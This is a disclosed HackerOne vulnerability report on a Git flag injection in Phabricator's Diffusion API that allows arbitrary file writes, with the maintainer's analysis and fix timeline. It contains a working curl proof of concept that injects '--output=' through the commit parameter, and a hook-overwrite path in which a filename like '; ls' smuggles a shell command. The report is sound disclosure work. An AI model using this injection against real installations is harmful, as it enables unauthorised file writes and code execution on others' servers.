---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2021-07-25
submitted: 2021-01-02T16:03:35.444Z
bounty_usd: null
votes: 54
cve: []
program: "[[programs/phabricator|Phabricator]]"
reporter: "crownpeanut"
source: "https://hackerone.com/reports/1070247"
title: "Git flag injection leads to arbitrary file write"
---
# Git flag injection leads to arbitrary file write

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 54 | **Program:** Phabricator | **Disclosed:** 2021-07-25

- Report: [https://hackerone.com/reports/1070247](https://hackerone.com/reports/1070247)
- CWE: Path Traversal
- Submitted: 2021-01-02T16:03:35.444Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

keyword : mongoose

#PoC
1.  Login and generate API token
2. Create a repo and push several commits to phabricator
3. Execute diffusion api
```
curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \
    -d api.token=api-token \
    -d commit=--output%3D/tmp/qqq \
    -d repository=R2
```

4. `qqq` file will be created in `tmp` directory. And the content of  `qqq` contains the output of git log.

#Description
`git log` command is used to show git history in phabricator. 
API such as diffusion.internal.gitrawdiffquery and [several others](https://sourcegraph.com/search?q=repo:%5Egithub%5C.com/phacility/phabricator%24+%22%27log+%22+-file:test+count:1000&patternType=regexp&case=yes) use git log command to retrieve commit details.
Because lack of validation of `commit` parameter, [this line](https://github.com/phacility/phabricator/blob/b2ab18f8f3d0cbab55b92da7a5fcbc0e148a4c99/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L99:20) will create command below when PoC is executed

```
git log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'
```

The content of `qqq` after api is executed.
```
$ cat /tmp/qqq
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c
```

Notice that `/tmp/qqqq` is controllable path. By specifying the right path it is possible to do arbitrary write.

If `/var/repo` is owned by `www-data`, attacker could rewrite `pre-receive` hook by commit filename `; ls` which the payload would be like file below.

```
$ cat /tmp/qqq
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls
```

This could be result in RCE when the next time `pre-receive` hook is called.

## Impact

Arbitrary file write in phabricator server. Depends on server configuration, it could result in RCE.

## Timeline

- **Report Filed**
- **2021-01-09** @crownpeanut: Any update regarding this issue?
- **Hacker Requested Mediation**
- **2021-01-10** @epriestley: Sorry for the delay. This appears to be a legitimate security issue that I expect to award you for once I resolve it.

---

I didn't realize this at first, but, for future readers, an important component of this report is that if this file is installed as a Git hook verbatim and has `+x`:

```
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls
```

...it will execute `ls` when the hook executes. That is, even though this file no interpreter line (like `#!/bin/sh`), and has a long prefix of garbage, it will still execute `ls`:

  - some system default interpreter, presumably `/bin/sh` or `SHELL` or something, will be selected;
  - it will attempt to evaluate the command `:100644`;
  - this will fail;
  - shell script execution continues on failure;
  - it will then execute `ls`.

This is *awful*. See also <https://secure.phabricator.com/book/phabricator/article/exit_codes/> for more on "Bash is Bad", perhaps.

---

I believe there is no way to pass the value `--output=...` to `git log <ref>` (and possibly other Git commands which accept *both* a ref and a list of paths) safely on the command line (that is, there is no way to `git log` against a branch named `--output=this-is-a-branch-name` by passing the branch name on the CLI). Phabricator already uses `--` to separate the list of paths, but the commit must be specified before `--` and I don't see a way to prevent `git` from interpreting it as a flag.

In the specific case of `git log`, the commit could be passed via stdin by using `--stdin`. However, this makes invoking `git log` significantly more complex.

Since `--output=...` and similar are not valid Git branch or tag names anyway, we *can* reject values in this form without loss of correctness. I'd strongly prefer to implement a solution which preserves semantics (i.e., I'd prefer Git be called in a way that makes it interpret "--output" as a ref name, not a flag) over a solution which rejects "bad" arguments, but I don't see a reasonable way to do that here while still passing the argument on the CLI. See also <https://secure.phabricator.com/T13491>, perhaps.

To move forward here, I plan to:

  - review calls to `git log` and identify which ones are vulnerable;
  - review other `git` calls and try to verify that there are no other calls in this form (`git xxx <ref> -- <paths>` or similar).

Ideally, if (a) only `git log` is vulnerable and (b) all existing callsites can reasonably be updated to use `--stdin`, the fix I would most prefer would be to switch to `--stdin`. This also improves behavior in the presence of very large numbers of file paths or very long file paths (see <https://secure.phabricator.com/T10832>, perhaps, historically), although neither of these cases are particularly important.

If other commands are vulnerable, and/or not all `git log` calls can easily be updated to use `--stdin`, I may apply a stopgap patch to filter and reject arguments in a "flag-like" format, similar to `hgsprintf()`. I'd prefer to avoid this.

---

In a normally-configured system, I expect `pre-commit` will not be writable by the web process (the daemons install a hook and `chmod 0755` it in `PhabricatorRepositoryPullEngine::installHook()`). Since the attacker is limited in the content they can write and/or their ability to `+x` files, I don't see a *guaranteed* pathway to escalating into RCE in the general case and suspect few systems are vulnerable in practice, but the `pre-commit` attack is straightforward in the case where the web process can write to it.

---

This may take a bit of time to audit and fix, particularly if I decide to switch all callsites to `--stdin`, but I expect to either have a patch or an update by the end of the week (Jan 15th).
- **2021-01-15** @epriestley: I believe this is now resolved, see:

  - https://secure.phabricator.com/T13589
  - https://secure.phabricator.com/D21509
  - https://secure.phabricator.com/D21510

Several other Git commands (including `blame` and `diff`) have the same ambiguity in parsing ref selectors that you identified with `log`. Most of the affected commands do not appear to have any way to pass ref selectors unambiguously (that is, no equivalent of `--stdin`), so I ultimately added argument filtering instead (in the form of a new `gitsprintf()` function which rejects selectors which may be interpreted as flags).

Let me know if you catch anything I missed.
- **Bounty Awarded**
- **2021-01-15** @epriestley: I usually request immediate disclosure once a fix is available upstream, because Phabricator is open source and fixes usually disclose the nature of vulnerabilities, so there is no benefit to waiting on disclosure.

However, in this case, the fix covers enough area that I think the specific attack you outline (using `log`, `--output`, and writing to a commit hook) is not obvious, so I'd prefer to wait out the standard disclosure window duration to give installs more opportunity to upgrade.

Thanks for the report!
- **2021-01-16** @crownpeanut: Hi @epriestley 
Thanks for the bounty and patch update.

For the follow up, these are some source code that you might miss
1. [sink1](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionRefsQueryConduitAPIMethod.php#L33)
2. [sink2](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L101)
3. [sink3](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/engine/DiffusionCommitHookEngine.php#L613)
4. [sink4](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/query/lowlevel/DiffusionLowLevelCommitQuery.php#L82)
5. [sink5](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/repository/daemon/PhabricatorGitGraphStream.php#L24)
6. [sink6](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/repository/engine/PhabricatorRepositoryRefEngine.php#L496)
7. [sink7](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L109)

For example, sink1 have the ability to specify output path but unable to control file content, sink2 still has ability to  write arbitrary path with arbitrary content, etc.
Since I just grep the source code, I'm not sure if it is really exploitable or what kind of impact it might has.
Maybe you might want to look at those? :D
- **2021-01-20** @epriestley: Thanks!

I caught one more `git diff-tree` in [LowLevelFilesizeQuery:35](https://secure.phabricator.com/source/phabricator/browse/master/src/applications/diffusion/query/lowlevel/DiffusionLowLevelFilesizeQuery.php$35), too.

I think these should be fixed by <https://secure.phabricator.com/D21511>.
- **2021-06-25** @crownpeanut: I think this issue has been fixed quiet a long time ago. Could you please disclose this issue? @epristley
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
